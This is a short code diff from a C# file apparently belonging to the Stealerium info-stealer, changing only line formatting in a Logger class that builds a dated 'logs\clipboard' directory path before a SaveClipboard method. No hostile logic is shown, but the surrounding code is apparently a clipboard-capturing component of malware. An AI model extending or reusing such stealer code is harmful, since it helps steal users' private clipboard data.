@@ -7,7 +7,8 @@ namespace Stealerium.Clipper
     internal sealed class Logger
     {
         private static readonly string _logDirectory = Path.Combine(
-            Paths.InitWorkDir(), "logs\\clipboard\\" +
+            Paths.InitWorkDir(),
+            "logs\\clipboard\\" +
                                  DateTime.Now.ToString("yyyy-MM-dd"));
 
         public static void SaveClipboard()
